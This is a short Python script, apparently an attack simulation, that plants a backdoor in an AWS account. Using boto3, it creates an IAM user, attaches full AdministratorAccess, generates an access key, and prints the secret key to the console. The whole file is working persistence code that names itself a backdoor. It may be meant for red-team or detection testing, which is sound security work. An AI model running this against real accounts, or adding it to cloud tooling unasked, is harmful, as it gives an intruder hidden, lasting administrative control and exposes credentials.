import boto3

def simulate_iam_backdoor(username):
    iam = boto3.client("iam")

    print(f"[+] Creating BACKDOOR IAM user: {username}")

    # 1. Create user
    iam.create_user(UserName=username)

    # 2. Attach Admin permissions
    iam.attach_user_policy(
        UserName=username,
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    print(f"[+] Attached Admin policy to {username}")

    # 3. Create Access Key
    key = iam.create_access_key(UserName=username)
    access_key = key["AccessKey"]["AccessKeyId"]
    secret = key["AccessKey"]["SecretAccessKey"]

    print(f"[+] Backdoor Access Key Created for {username}")
    print(f"    ACCESS KEY: {access_key}")
    print(f"    SECRET KEY: {secret}")

    return key
